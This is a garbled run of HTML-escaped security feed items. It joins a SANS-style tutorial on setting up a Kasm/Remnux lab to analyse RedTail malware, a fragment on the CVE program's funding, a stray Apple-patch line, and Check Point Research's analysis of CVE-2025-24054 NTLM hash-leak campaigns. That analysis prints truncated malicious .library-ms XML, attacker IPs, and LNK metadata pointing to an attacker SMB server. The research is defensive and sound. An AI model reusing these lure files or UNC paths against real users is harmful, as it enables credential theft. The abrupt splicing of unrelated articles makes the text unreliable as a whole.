&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;When I first saw malware being uploaded to my honeypot, I was lacking the requisite experience to reverse engineer it, and to understand what was happening with the code. Even though I could use any text editor to examine the associated scripts that were being uploaded with RedTail malware, I couldn&amp;rsquo;t see what was happening with the redtail malware itself. So, I decided to create a how-to on setting up a malware analysis program.&lt;/p&gt;

&lt;p&gt;The malware analysis platform I chose to use, is Remnux which is a linux distribution, packaged with a variety of analysis tools originally created by Lenny Zeltser, a SANS instructor. [&lt;a href="https://remnux.org"&gt;1&lt;/a&gt;] [&lt;a href="https://www.sans.org/profiles/lenny-zeltser/"&gt;2&lt;/a&gt;] My original intent for the Remnux environment was to set it up inside a docker, so it was completely isolated from my computer. This way if I accidently detonated a malware sample, I could easily just wipe away the docker. I can also wipe away the docker, after I&amp;rsquo;ve finished analyzing a sample, and start with a fresh install each time I begin a new investigation.&lt;/p&gt;

&lt;p&gt;For this how-to, I&amp;rsquo;ll also make use of kasm workspaces which is a docker container streaming platform, and I&amp;rsquo;ll deploy it inside of a free tier of AWS EC2 instance, this approach will make it easy to access your workspace, from a web browser.&lt;/p&gt;

&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Setup&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;1.&amp;nbsp;&amp;nbsp; &amp;nbsp;First you need to launch an EC2 instance in AWS. Go to the AWS Sign Up page. You can follow this website for initial account setup: [&lt;a href="https://github.com/15HzMonitor/Internship-Blog-Post/blob/main/1.%20AWS%20DShield%20Sensor%20Setup.md#sign-up-for-an-aws-account"&gt;3&lt;/a&gt;] &lt;a href="https://github.com/15HzMonitor/Internship-Blog-Post/blob/main/1. AWS DShield Sensor Setup.md#sign-up-for-an-aws-account"&gt;Sign Up For An AWS Account&lt;/a&gt;. I won&amp;rsquo;t go to deep into setting up an EC2 instance as you can follow along with the linked GitHub page above. However, for the Kasm Workspaces setup, you&amp;rsquo;ll need to create an EC2 instance with 2 vcpu&amp;rsquo;s, 16 gigs of ram, and 100GB disc, which is the minimum needed for a Kasm Remnux workspace install. Also, be sure to allow http and https traffic inbound. The rest of the setup above, should be followed exactly.&amp;nbsp;&lt;br /&gt;
2.&amp;nbsp;&amp;nbsp; &amp;nbsp;Once you&amp;rsquo;ve deployed an ubuntu 20.04 with the RSA key, log into your EC2 instance with:&lt;span style="font-family: Courier New,Courier,monospace;"&gt; ssh -I rsatoken.pem ubuntu@&amp;lt;whatever your IP is&lt;/span&gt;&lt;br /&gt;
3.&amp;nbsp;&amp;nbsp; &amp;nbsp;Then to install the kasm workspace perform these commands:&lt;/p&gt;

&lt;p&gt;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;cd /tmp&lt;br /&gt;
curl -O https://kasm-static-content.s3.amazonaws.com/kasm_release_1.16.1.98d6fa.tar.gz tar -xf kasm_release_1.16.1.98d6fa.tar.gz&lt;br /&gt;
sudo bash kasm_release/install.sh&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;4.&amp;nbsp;&amp;nbsp; &amp;nbsp;You&amp;rsquo;ll be asked if you want to create a swap partition, click &amp;ldquo;Yes&amp;rdquo; and the 8GB swap size is fine. It&amp;rsquo;ll take about 5 minutes to finish installing so be patient.&lt;br /&gt;
5.&amp;nbsp;&amp;nbsp; &amp;nbsp;When it finishes, it&amp;rsquo;ll output the credentials you&amp;rsquo;ll need to access it. Copy these off and store them somewhere securely.&lt;br /&gt;
&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;
6.&amp;nbsp;&amp;nbsp; &amp;nbsp;Once you&amp;rsquo;ve finished installing, return to your web browser, and enter in https://&amp;lt;ip of your EC2 instance&amp;gt; and login with the admin@kasm.local credential.&amp;nbsp;&lt;br /&gt;
7.&amp;nbsp;&amp;nbsp; &amp;nbsp;Once you&amp;rsquo;ve logged in, click the workspaces link on the left side of the screen and you&amp;rsquo;ll be presented with the below option. Kasm comes complete with a large variety of workspaces you can chose from. Select &amp;ldquo;Add from Registry&amp;rdquo; as seen in the screen shot below.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture1.png" style="width: 1430px; height: 633px;" /&gt;&lt;/p&gt;

&lt;p&gt;8.&amp;nbsp;&amp;nbsp; &amp;nbsp;Once that is complete, you can search for Remnux and select &amp;ldquo;install&amp;rdquo;. &amp;nbsp;It will take about 10-15 minutes to install. When it&amp;rsquo;s finished it should be present in your &amp;ldquo;Workspaces&amp;rdquo; tab, in the admin control center. Ensure the &amp;ldquo;enabled&amp;rdquo; switch is toggled on.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture2.png" style="width: 624px; height: 224px;" /&gt;&lt;/p&gt;

&lt;p&gt;9.&amp;nbsp;&amp;nbsp; &amp;nbsp;Next, click the workspaces link to the left of the Admin button at the top of the page.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture3.png" /&gt;&lt;/p&gt;

&lt;p&gt;10.&amp;nbsp;&amp;nbsp; &amp;nbsp;Now you&amp;rsquo;re ready to go. Click the Remnux Desktop in the middle of the screen. It will launch a Remnux virtual machine, right in your web browser.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture4.png" style="width: 1406px; height: 515px;" /&gt;&lt;/p&gt;

&lt;p&gt;11.&amp;nbsp;&amp;nbsp; &amp;nbsp;Time to analyze the RedTail malware. First, we need to upload a sample to our Remnux. Click the tab to the left of the Downloads and Uploads folder, and then click on upload. Once you&amp;rsquo;ve uploaded your file to the machine, it&amp;rsquo;ll appear in the &amp;ldquo;uploads folder&amp;rdquo;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture5.png" /&gt;&lt;/p&gt;

&lt;p&gt;When it comes to analyzing malware, there&amp;rsquo;s 2 different approaches that should both be used. Analyze the malware statically first, that is, with the program at rest on your disc drive. We first need to identify what type of file it is. In a terminal on your Remnux box, we&amp;rsquo;ll use the file command to identify it.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture6.png" style="width: 624px; height: 398px;" /&gt;&lt;/p&gt;

&lt;p&gt;We can see it&amp;rsquo;s an ELF 64-bit file based on x86 CPU architecture. An ELF file, which stands for Executable and Linkable Format, is a standard file format used for storing executable programs, libraries, and object files on operating systems like Linux and macOS. The next static analysis utility we can use is called Detect It Easy (die) just by typing die into the command line. This program will tell us what operating system it was compiled on, what compiler was used and what programming language. However, for our RedTail sample, it&amp;rsquo;s clearly been packed with UPX, so we can&amp;rsquo;t immediately discern what the language for this is.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture7.png" style="width: 624px; height: 455px;" /&gt;&lt;/p&gt;

&lt;p&gt;In the context of UPX (Ultimate Packer for eXecutables), the &amp;lsquo;LZMA, brute&amp;rsquo; flags indicates that it was packed with the LZMA compression algorithm, and the &amp;lsquo;brute&amp;rsquo; is a command line option that forces UPX to try all available compression methods, to find the best compression ratio. We&amp;rsquo;ll need to unpack it first. I actually needed to download a newer version of UPX, because the Remnux upx packer was out of date. But once that was done I just ran ./upx -d &amp;lt;file&amp;gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture8.png" style="width: 624px; height: 205px;" /&gt;&lt;/p&gt;

&lt;p&gt;Now we can go back to our Detect It Easy (die) application and see if we&amp;rsquo;ve successfully unpacked it.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture9.png" style="width: 624px; height: 224px;" /&gt;&lt;/p&gt;

&lt;p&gt;We know now it was compiled using GCC, in C/C++. The next thing we could do is run the strings command on the sample, now that it&amp;rsquo;s unpacked to see if there&amp;rsquo;s any additional base64 encoded commands, or other interesting plain text ASCII strings in there. I won&amp;rsquo;t provide a screen shot of the strings command for this RedTail sample, as they&amp;rsquo;re too numerous to display.&lt;/p&gt;

&lt;p&gt;Finally, we&amp;rsquo;ll examine this sample with &lt;a href="https://ghidra-sre.org"&gt;[4]&lt;/a&gt; Ghidra. Ghidra is a very popular malware analysis tool, developed by the NSA which can be used to decompile a binary file, read its source code, and debug it while performing dynamic analysis. You&amp;rsquo;ll find the Ghidra application under the Applications tab at the top left, and then under the Dev folder. When Ghidra first launches, you&amp;rsquo;ll need to create a new project first before you can do any dynamic analysis. For my project I just called it Redtail.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture10.png" style="width: 624px; height: 469px;" /&gt;&lt;/p&gt;

&lt;p&gt;Next, you&amp;rsquo;ll need to import the malware sample. Select &amp;ldquo;Import File&amp;hellip;&amp;rdquo; Once it&amp;rsquo;s imported it&amp;rsquo;ll give you a lot of information such as the address size, processor architecture, file hashes, etc. You can close the &amp;ldquo;import summary&amp;rdquo; file and then you&amp;rsquo;ll see your project folder with your imported file. Double-click the sample and continue with the &amp;ldquo;analyze&amp;rdquo; button.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture11.png" style="width: 350px; height: 264px;" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Jacob_Claycamp_Picture12.png" style="width: 624px; height: 263px;" /&gt;&lt;/p&gt;

&lt;p&gt;Under the Symbol Tree pane, there should be a main function or an entry function which is where the main program is written. As you can see from the screenshot above, RedTail malware is complex, with many functions referenced in the entry, and because of this complexity, I won&amp;rsquo;t dive into it any further.&lt;/p&gt;

&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The above is a how-to on setting up a dockerized cloud instance for malware analysis, which provides for containment, as well as easy reset to baseline. Then I provide some very basic entry level analysis techniques. Even if you aren&amp;rsquo;t good at programming or reading program language, the techniques in this article are still very useful in pulling out IOC&amp;rsquo;s, file hashes, etc, and comparing samples. Many threat actors will take a particular sample of malware and modify it to accomplish something slightly different. Not all malware is as complex as Redtail. Some malware is only a few lines of code, and you can quickly understand what it&amp;rsquo;s doing. With Ghidra you can track a malwares&amp;rsquo; evolution over time and determine how it&amp;rsquo;s being modified and employed. If you wish to get further into the forest of malware, I encourage you to check out Lenny Zeltser&amp;rsquo;s webpage, [&lt;a href="http://zeltser.com"&gt;5&lt;/a&gt;] and if you want an even deeper lesson into malware analysis, check out his presentation to the RSA Conference in 2021.

It&amp;#8217;s kind of crazy to think that the US government might damage its own security in this way&amp;#8212;but I suppose no crazier than any of the other ways the US is working against its own interests right now.&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Sasha Romanosky, senior policy researcher at the Rand Corporation, branded the end to the CVE program as &amp;#8220;tragic,&amp;#8221; a sentiment echoed by many cybersecurity and CVE experts reached for comment.&lt;/p&gt;
&lt;p&gt;&amp;#8220;CVE naming and assignment to software packages and versions are the foundation upon which the software vulnerability ecosystem is based,&amp;#8221; Romanosky said. &amp;#8220;Without it, we can&amp;#8217;t track newly discovered vulnerabilities. We can&amp;#8217;t score their severity or predict their exploitation. And we certainly wouldn&amp;#8217;t be able to make the best decisions regarding patching them.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Ben Edwards, principal research scientist at Bitsight, told CSO, &amp;#8220;My reaction is sadness and disappointment. This is a valuable resource that should absolutely be funded, and not renewing the contract is a mistake.&amp;#8221;&lt;/p&gt;
&lt;p&gt;He added &amp;#8220;I am hopeful any interruption is brief and that if the contract fails to be renewed, other stakeholders within the ecosystem can pick up where MITRE left off. The federated framework and openness of the system make this possible, but it&amp;#8217;ll be a rocky road if operations do need to shift to another entity.&amp;#8221;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;More similar quotes in the article.&lt;/p&gt;
&lt;p&gt;My guess is that we will somehow figure out how to transition this program to continue without the US government. It&amp;#8217;s too important to be at risk.&lt;/p&gt;

&lt;p&gt;Today, Apple patched two vulnerabilities that had already been exploited. The vulnerabilities were exploited against iOS but also exist in macOS, tvOS, and visionOS. Apple released updates for all affected operating systems.&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;table class="datatable"&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/"&gt;CVE-2025-24054, NTLM Exploit in the Wild&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Key Points&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;CVE-2025-24054&lt;/strong&gt; is a vulnerability related to &lt;strong&gt;NTLM hash disclosure via spoofing&lt;/strong&gt;, which can be exploited using a maliciously crafted &lt;code&gt;.library-ms&lt;/code&gt; file. Active exploitation in the wild has been observed since &lt;strong&gt;March 19, 2025&lt;/strong&gt;, potentially allowing attackers to leak NTLM hashes or user passwords and compromise systems. Although Microsoft released a patch on &lt;strong&gt;March 11, 2025&lt;/strong&gt;, threat actors already had over a week to develop and deploy exploits before the vulnerability began to be actively abused.&lt;/li&gt;



&lt;li&gt;Around &lt;strong&gt;March 20–21, 2025&lt;/strong&gt;, a campaign targeted &lt;strong&gt;government&lt;/strong&gt; and &lt;strong&gt;private institutions&lt;/strong&gt; in &lt;strong&gt;Poland&lt;/strong&gt; and &lt;strong&gt;Romania&lt;/strong&gt;. Attackers used malspam to distribute a Dropbox link containing an archive that exploited multiple known vulnerabilities, including &lt;strong&gt;CVE-2025-24054,&lt;/strong&gt; to harvest &lt;strong&gt;NTLMv2-SSP hashes&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;Initial reports suggested that exploitation occurred once the &lt;code&gt;.library-ms&lt;/code&gt; file was unzipped. However, Microsoft’s patch documentation indicated that the vulnerability could even be triggered with minimal user interaction, such as right-clicking, dragging and dropping, or simply navigating to the folder containing the malicious file. This exploit appears to be a variant of a previously patched vulnerability, &lt;strong&gt;CVE-2024-43451&lt;/strong&gt;, as both share several similarities.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;NTLM (New Technology LAN Manager)&lt;/strong&gt; is a suite of authentication protocols developed by Microsoft to verify user identities and protect the integrity and confidentiality of network communications. NTLM operates through a direct client-server exchange known as the &lt;strong&gt;NTLM challenge/response mechanism&lt;/strong&gt;, in which the server challenges the client to prove its identity without sending the user&amp;#8217;s actual password over the network.&lt;/p&gt;



&lt;p&gt;The original version, &lt;strong&gt;NTLMv1&lt;/strong&gt;, had several security flaws that made it vulnerable to attacks such as &lt;strong&gt;pass-the-hash&lt;/strong&gt; and &lt;strong&gt;rainbow table attacks&lt;/strong&gt;. In NTLMv1, the client responds to the server&amp;#8217;s challenge by sending a predictable hash of the user&amp;#8217;s password (the &lt;strong&gt;NT hash&lt;/strong&gt;). Attackers could try to crack the password offline or reuse this hash if they managed to intercept it. To reduce these risks, Microsoft introduced &lt;strong&gt;NTLMv2&lt;/strong&gt;, which significantly improves security by adding both a &lt;strong&gt;random server challenge&lt;/strong&gt; and a &lt;strong&gt;client challenge&lt;/strong&gt; into the authentication process. Instead of sending the NT hash directly, NTLMv2 generates a unique response known as the &lt;strong&gt;NTLMv2 response&lt;/strong&gt; (also referred to as the &lt;strong&gt;NTLMv2-SSP hash&lt;/strong&gt; or &lt;strong&gt;Net-NTLMv2&lt;/strong&gt;). This renders precomputed attacks (like rainbow tables and pass-the-hash) largely ineffective.&lt;/p&gt;



&lt;p&gt;However, if attackers are able to capture these NTLMv2 responses, they can still attempt to &lt;strong&gt;brute-force&lt;/strong&gt; the hash offline or perform &lt;strong&gt;relay attacks&lt;/strong&gt;. NTLM relay attacks fall under the category of &lt;strong&gt;man-in-the-middle (MitM)&lt;/strong&gt; attacks that exploit the NTLM authentication protocol. Instead of cracking the password, the attacker captures the hash and passes it to another service to authenticate as the user. NTLM relay attacks are much more dangerous when the stolen credentials belong to a privileged user, as the attacker is using it for privilege escalation and lateral movement on the network.&lt;/p&gt;



&lt;p&gt;In the past few months, Microsoft has been busy releasing security updates aimed at fixing NTLM Hash Disclosure vulnerabilities via spoofing. One such vulnerability, &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43451"&gt;&lt;strong&gt;CVE-2024-43451&lt;/strong&gt;&lt;/a&gt;, was patched on November 12, 2024, after it was exploited in a campaign targeting Ukraine. CERT-UA has linked this activity to UAC-0194, a threat actor believed to be connected to Russia. Fast forward to March 11, 2025, when Microsoft rolled out a patch for another similar vulnerability, &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24054"&gt;&lt;strong&gt;CVE-2025-24054&lt;/strong&gt;&lt;/a&gt;, which also allows NTLM hash disclosure with very little user interaction. For CVE-2025-24054, users can trigger the attack simply by right-clicking or navigating to the folder that holds the maliciously crafted &lt;code&gt;.library-ms&lt;/code&gt; file.&lt;/p&gt;



&lt;p&gt;Threat actors began actively exploiting CVE-2025-24054 just eight days after the patch was released. Since then, &lt;strong&gt;Check Point Research&lt;/strong&gt; has reported multiple &lt;strong&gt;malspam campaigns&lt;/strong&gt; leveraging this flaw, all observed within less than two weeks.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;CVE-2025-24054&lt;/h2&gt;



&lt;p&gt;Microsoft, on March 11, 2025, released a security patch protecting against a vulnerability in Windows Explorer that leaks &lt;strong&gt;NTLMV2-SSp&lt;/strong&gt; when a malicious &lt;code&gt;.library-ms&lt;/code&gt; file is extracted from a ZIP archive. This vulnerability was classified with the CVE ID, &lt;strong&gt;CVE-2025-24054&lt;/strong&gt; and was exploited in all the latest Windows versions. This vulnerability is triggered when a user extracts a ZIP archive containing a malicious &lt;code&gt;.library-ms&lt;/code&gt; file. This event will trigger Windows Explorer to initiate an SMB authentication request to a remote server and, as a result, it leaks the user’s NTLM hash without any user interaction.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&gt;
&amp;lt;libraryDescription xmlns="&amp;lt;http://schemas.microsoft.com/windows/2009/library&gt;"&gt;

      &amp;lt;/simpleLocation&gt;
    &amp;lt;/searchConnectorDescription&gt;
  &amp;lt;/searchConnectorDescriptionList&gt;
&amp;lt;/libraryDescription&gt;
&lt;/pre&gt;



&lt;p&gt;The images below demonstrate network activity where a user’s &lt;strong&gt;NTLMV2-SSp hash&lt;/strong&gt; is leaked via SMB to a malicious SMB server at IP address &lt;code&gt;194.127.179[.]157&lt;/code&gt;. Once the user triggers the exploit with minimal interaction, the client initiates SMB requests. Upon processing the &lt;code&gt;NTLMSSP_AUTH&lt;/code&gt; message, the client inadvertently leaks the user’s NTLMV2-SSp to the malicious server.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31377" height="129" src="https://research.checkpoint.com/wp-content/uploads/2025/04/img_pcapv2-1024x129.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 — CVE-2025-24054, Exploit PCAP.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;

&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31378" height="257" src="https://research.checkpoint.com/wp-content/uploads/2025/04/img_pcapv21-Copy.png" width="717" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 — PCAP NTLMv2-SSP Hash.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Exposing a user’s NTLMV2-SSp hash allows the attacker to obtain the user’s password by brute force or perform relay attacks. If the compromised account has high privileges and improper mitigations (such as SMB signing and NTLM relay protections), this could lead to lateral movement, privilege escalation, or even full domain compromise.&lt;/p&gt;



&lt;p&gt;Microsoft had initially assigned the vulnerability the CVE identifier &lt;strong&gt;CVE-2025-24071&lt;/strong&gt;, but it has since been updated to &lt;strong&gt;CVE-2025-24054&lt;/strong&gt;.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Campaigns Utilizing CVE-2025-24054&lt;/h2&gt;



&lt;p&gt;Eight days after the Microsoft security patch, &lt;strong&gt;Check Point Research&lt;/strong&gt; discovered the first campaign utilizing &lt;strong&gt;CVE-2025-24054&lt;/strong&gt;. Until March 25, we have observed approximately another 10 campaigns with the end goal of retrieving NTLMV2-SSp hashes from the targeted victims. The SMB servers collecting those were hosted in Russia, Bulgaria, the Netherlands, Australia and Turkey.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;NTLM Exploits Bomb Campaign&lt;/h3&gt;



&lt;p&gt;The campaign appears to have occurred around March 20–21, 2025. The main targets seem to have been the Polish and Romanian governments and private institutions. The campaign targeted the victims via email phishing links, which include an archive file, downloaded from Dropbox. Once the user downloads and extracts the archive&amp;#8217;s contents, it triggers the exploit that leaks the NTLMV2-SSp hash.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31379" height="266" src="https://research.checkpoint.com/wp-content/uploads/2025/04/img_email.png" width="1005" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 — Email campaign.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The archive &lt;code&gt;xd.zip&lt;/code&gt; was downloaded from Dropbox and contained files with the sole purpose of leaking NTLMV2-SSp hashes. Those four embedded files contacted a malicious SMB server with IP address &lt;code&gt;159.196.128[.]120&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;1. xd.library-ms &amp;#8211; CVE-2025-24054&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Once the archive was unzipped, this file triggered &lt;strong&gt;CVE-2025-24054,&lt;/strong&gt; an NTLM Hash Disclosure Spoofing Vulnerability.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&gt;
&amp;lt;libraryDescription xmlns="&amp;lt;http://schemas.microsoft.com/windows/2009/library&gt;"&gt;

      &amp;lt;/simpleLocation&gt;
    &amp;lt;/searchConnectorDescription&gt;
  &amp;lt;/searchConnectorDescriptionList&gt;
&amp;lt;/libraryDescription&gt;
&lt;/pre&gt;



&lt;p&gt;&lt;strong&gt;2. xd.url &amp;#8211; CVE-2024-43451&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The &lt;code&gt;.url&lt;/code&gt; file extension is used to create &lt;strong&gt;Internet shortcuts&lt;/strong&gt; that point to web addresses (URLs). URLs are plain text files that store a website&amp;#8217;s address. When you double-click a &lt;code&gt;.url&lt;/code&gt; file, your default web browser opens the corresponding URL. The &lt;strong&gt;&lt;code&gt;.url&lt;/code&gt;&lt;/strong&gt; file type can also reference network resources via a &lt;strong&gt;UNC (Universal Naming Convention)&lt;/strong&gt; path. A UNC path points to a network location, usually in the format:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;\\\\ServerName\\SharedFolder\\Resource
&lt;/pre&gt;



&lt;p&gt;This path indicates a &lt;strong&gt;network share&lt;/strong&gt; (e.g., a shared folder or file on another machine). The connections created are primarily based on the &lt;strong&gt;network protocol&lt;/strong&gt; used and how the resource is shared. The most common type of connection established with UNC paths involves the &lt;strong&gt;Server Message Block (SMB)&lt;/strong&gt; protocol. Triggering files that support UNC paths can potentially lead to &lt;strong&gt;SMB (Server Message Block)&lt;/strong&gt; connections, which might expose sensitive information, including &lt;strong&gt;NTLMv2 hashes.&lt;/strong&gt; The &lt;code&gt;.url&lt;/code&gt; file embedded within this archive is associated with the &lt;strong&gt;CVE-2024-43451&lt;/strong&gt; vulnerability, which has been actively exploited in the wild. The exploitation involves &lt;strong&gt;.url files&lt;/strong&gt; containing malicious code capable of executing upon unusual user interactions. These interactions include &lt;strong&gt;right-clicking&lt;/strong&gt; the file, &lt;strong&gt;deleting&lt;/strong&gt; it, or performing a &lt;strong&gt;drag-and-drop operation&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;This CVE was previously exploited as a zero-day vulnerability and was used in attacks targeting Ukraine. According to &lt;strong&gt;CERT-UA&lt;/strong&gt;, the campaign was attributed to the threat actor &lt;strong&gt;UAC-0194&lt;/strong&gt;, which is suspected to be &lt;strong&gt;Russian-affiliated&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;3. xd.website&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The &lt;code&gt;.website&lt;/code&gt; file functions similarly to &lt;code&gt;.url&lt;/code&gt; files but with some extra metadata designed for modern web applications. These files store &lt;strong&gt;URL information&lt;/strong&gt; along with additional data such as &lt;strong&gt;browser settings&lt;/strong&gt;, &lt;strong&gt;app-specific settings&lt;/strong&gt;, and icons used for pinned web apps, making them slightly more advanced than the simpler &lt;code&gt;.url&lt;/code&gt; files. They could also potentially link to a &lt;strong&gt;local or network resource&lt;/strong&gt; via a UNC path, triggering an SMB connection once the user manually interacts with such files.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4. xd.lnk&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The &lt;code&gt;.lnk&lt;/code&gt; file extension is used for &lt;strong&gt;Windows shortcuts&lt;/strong&gt;. A shortcut is essentially a pointer or reference to another file, folder, or program. When you double-click a &lt;code&gt;.lnk&lt;/code&gt; file, Windows automatically opens the linked target file or application, which can be a program, document, or can be used to point to a network resource using a &lt;strong&gt;UNC path&lt;/strong&gt;. Once the target path of an LNK file is a remote server, an SMB connection will be triggered, and upon the &lt;code&gt;NTLMSSP_AUTH&lt;/code&gt; message, the client inadvertently leaks the user’s NTLMV2-SSp. The LNK file below, distributed as part of this archive, requires manual user interaction to trigger the SMB connection. Bellow is the LNK metadata:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Target Path      : \\\\159.196.128.120
Working Directory: None
Arguments        : None
Description      : None
Icon Location    : None
Relative Path    : ..\\..\\..\\..\\Windows
Show Command     : Normal
&lt;/pre&gt;



&lt;p&gt;All the mentioned files, once clicked manually by the user, attempt to access the network share, initiating an SMB connection, which potentially could expose NTLMV2-SSp hashes to the malicious actor. However, two of those files that used exploits did not even require the user to take such actions. The SMB server at &lt;code&gt;159.196.128[.]120&lt;/code&gt; harvested such hashes, likely for use in further attack operations. In January 2024, cybersecurity firm &lt;strong&gt;HarfangLab&lt;/strong&gt; reported this IP as being linked to &lt;strong&gt;APT28,&lt;/strong&gt; also known as &lt;strong&gt;Fancy Bear&lt;/strong&gt; or &lt;strong&gt;Forest Blizzard&lt;/strong&gt; a Russian state-sponsored threat actor. However, at this time, we have no further information directly associating this IP with the mentioned APT group.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Email Campaign with Non-archived &lt;code&gt;.library-ms&lt;/code&gt;&lt;/h3&gt;



&lt;p&gt;Initial reports indicated that exploitation was triggered once the &lt;code&gt;.library-ms&lt;/code&gt; file was unzipped. However, on March 25, 2025, Check Point Research discovered a campaign targeting companies around the world, distributing these files without being zipped. According to Microsoft, &lt;em&gt;this exploit is triggered with minimal user interaction with a malicious file, such as selecting (single-clicking), inspecting (right-clicking), or performing any action other than opening or executing the file&lt;/em&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31380" height="758" src="https://research.checkpoint.com/wp-content/uploads/2025/04/img_cmp2_eml.png" width="942" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 — Unzipped Exploit file.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;At this stage, unzipping the file was merely a side effect that triggered the exploit, with the actual cause being any minimal user interaction that could activate it, such as navigating to the folder where the file is located. As soon as victims downloaded the exploit, their NTLMV2-SSp hashes were leaked.&lt;/p&gt;

&lt;h2 class="wp-block-heading"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;The discovery and subsequent exploitation of &lt;strong&gt;CVE-2025-24054&lt;/strong&gt;, a vulnerability involving &lt;strong&gt;NTLM Hash Disclosure Spoofing&lt;/strong&gt;, underscores the growing sophistication of cyberattacks and the urgency for prompt patching and vigilance. Despite Microsoft releasing a security update on &lt;strong&gt;March 11, 2025&lt;/strong&gt; to address the issue, the vulnerability was actively exploited less than two weeks later in campaigns targeting government and private institutions in &lt;strong&gt;Poland&lt;/strong&gt; and &lt;strong&gt;Romania&lt;/strong&gt;. These attacks leveraged malicious &lt;code&gt;.library-ms&lt;/code&gt; files to collect &lt;strong&gt;NTLMv2 hashes&lt;/strong&gt; and escalate the risk of &lt;strong&gt;lateral movement&lt;/strong&gt; and &lt;strong&gt;privilege escalation&lt;/strong&gt; within compromised networks.&lt;/p&gt;



